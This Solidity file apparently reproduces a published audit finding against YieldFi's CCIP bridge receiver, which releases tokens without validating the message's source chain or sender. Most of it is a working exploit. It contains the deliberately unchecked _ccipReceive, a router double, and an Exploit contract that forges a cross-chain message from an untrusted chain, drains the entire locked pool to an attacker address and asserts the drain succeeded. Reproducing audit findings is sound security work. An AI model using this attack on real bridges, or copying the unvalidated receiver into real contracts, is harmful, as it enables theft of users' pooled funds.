// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Synthetic (browser-EVM, cheatcode-free) reproduction of AuditVault #55536 —
// YieldFi BridgeCCIP._ccipReceive performs a privileged unlock/mint WITHOUT
// validating the CCIP source chain / sender. An attacker on any CCIP-connected
// chain delivers a forged message and drains the bridge. The _ccipReceive prefix
// is verbatim from the Cyfrin report; Codec/CCIPReceiver are real source.

library Common {
    function isContract(address _addr) internal view returns (bool) {
        return _addr != address(0) && _addr.code.length != 0;
    }
}

library Constants {
    bytes32 internal constant BRIDGE_SEND_HASH = keccak256("BRIDGE_SEND");
}

struct BridgeSendPayload {
    uint32 dstId;
    address to;
    address token;
    uint256 amount;
    bytes32 trxnType;
}

error WrongDataLength();
error WrongAddressEncoding();
error WrongData();

library Codec {
    uint256 internal constant DATA_LENGTH = 32 * 5;

    function decodeBridgeSendPayload(bytes memory _data) internal view returns (BridgeSendPayload memory) {
        if (_data.length != DATA_LENGTH) revert WrongDataLength();
        (uint32 dstId, address to, address token, uint256 amount, bytes32 trxnType) =
            abi.decode(_data, (uint32, address, address, uint256, bytes32));
        if (trxnType != Constants.BRIDGE_SEND_HASH) revert WrongData();
        if (dstId == 0) revert WrongData();
        if (to == address(0)) revert WrongAddressEncoding();
        if (token == address(0) || !Common.isContract(token)) revert WrongAddressEncoding();
        if (amount == 0) revert WrongData();
        return BridgeSendPayload(dstId, to, token, amount, trxnType);
    }
}

library Client {
    struct EVMTokenAmount { address token; uint256 amount; }
    struct Any2EVMMessage {
        bytes32 messageId;
        uint64 sourceChainSelector;
        bytes sender;
        bytes data;
        EVMTokenAmount[] destTokenAmounts;
    }
}

abstract contract CCIPReceiver {
    address internal immutable i_ccipRouter;
    error InvalidRouter(address router);

    constructor(address router) {
        if (router == address(0)) revert InvalidRouter(address(0));
        i_ccipRouter = router;
    }

    function ccipReceive(Client.Any2EVMMessage calldata message) external virtual onlyRouter {
        _ccipReceive(message);
    }

    function _ccipReceive(Client.Any2EVMMessage memory message) internal virtual;

    modifier onlyRouter() {
        if (msg.sender != i_ccipRouter) revert InvalidRouter(msg.sender);
        _;
    }
}

contract BridgeToken {
    string public name = "YieldFi yToken";
    string public symbol = "yUSD";
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function transfer(address to, uint256 a) external returns (bool) {
        require(balanceOf[msg.sender] >= a, "!balance");
        balanceOf[msg.sender] -= a;
        balanceOf[to] += a;
        return true;
    }
}

interface IBridgeToken {
    function transfer(address to, uint256 amt) external returns (bool);
}

/// BridgeCCIP receiver — _ccipReceive prefix verbatim from the Cyfrin report.
contract BridgeCCIP is CCIPReceiver {
    address public localYToken;
    mapping(bytes32 => bool) public processedMessages;

    constructor(address _router, address _localYToken) CCIPReceiver(_router) {
        localYToken = _localYToken;
    }

    function _ccipReceive(Client.Any2EVMMessage memory any2EvmMessage) internal override {
        bytes memory message = abi.decode(any2EvmMessage.data, (bytes));
        BridgeSendPayload memory payload = Codec.decodeBridgeSendPayload(message);
        bytes32 _hash = keccak256(abi.encode(message, any2EvmMessage.messageId));
        require(!processedMessages[_hash], "processed");
        processedMessages[_hash] = true;
        require(payload.amount > 0, "!amount");
        // @audit-issue NO validation of any2EvmMessage.sourceChainSelector / sender
        // audited "..." action: unlock (L1) / mint (L2) to payload.to
        IBridgeToken(localYToken).transfer(payload.to, payload.amount);
    }
}

/// The opaque CCIP router boundary — CCIP delivers messages from ANY source.
contract RouterDouble {
    function deliver(BridgeCCIP dest, uint64 sourceSelector, address sender, bytes memory data) external {
        Client.Any2EVMMessage memory m = Client.Any2EVMMessage({
            messageId: keccak256(abi.encode(sourceSelector, data)),
            sourceChainSelector: sourceSelector,
            sender: abi.encode(sender),
            data: data,
            destTokenAmounts: new Client.EVMTokenAmount[](0)
        });
        dest.ccipReceive(m);
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint64 internal constant ATTACKER_CHAIN = 424242; // untrusted source chain
    address internal constant ATTACKER_SRC = 0xbaD0BAd0bAD0BAd0BAd0BAD0BaD0BaD0Bad0baD0;
    uint256 public constant LOCKED_POOL = 1_000 ether;

    RouterDouble public router;
    BridgeToken public yToken;
    BridgeCCIP public bridge;

    constructor() {
        router = new RouterDouble();
        yToken = new BridgeToken();
        bridge = new BridgeCCIP(address(router), address(yToken));
        // the bridge holds the locked cross-chain pool
        yToken.mint(address(bridge), LOCKED_POOL);
    }

    function run() external payable {
        // Forge a valid payload paying the attacker; dstId kept in uint32 range so
        // decoding succeeds (independent of the separate decode bug #55537).
        bytes memory inner = abi.encode(
            uint64(1), ATTACKER, address(yToken), LOCKED_POOL, Constants.BRIDGE_SEND_HASH
        );
        bytes memory data = abi.encode(inner);

        // Deliver from an UNTRUSTED chain + sender. The bridge never checks either.
        router.deliver(bridge, ATTACKER_CHAIN, ATTACKER_SRC, data);

        // HARM: the entire locked pool was released to the attacker on a message
        // no legitimate source chain ever sent.
        require(yToken.balanceOf(ATTACKER) == LOCKED_POOL, "attacker did not receive drained pool");
        require(yToken.balanceOf(address(bridge)) == 0, "bridge not drained");
    }
}
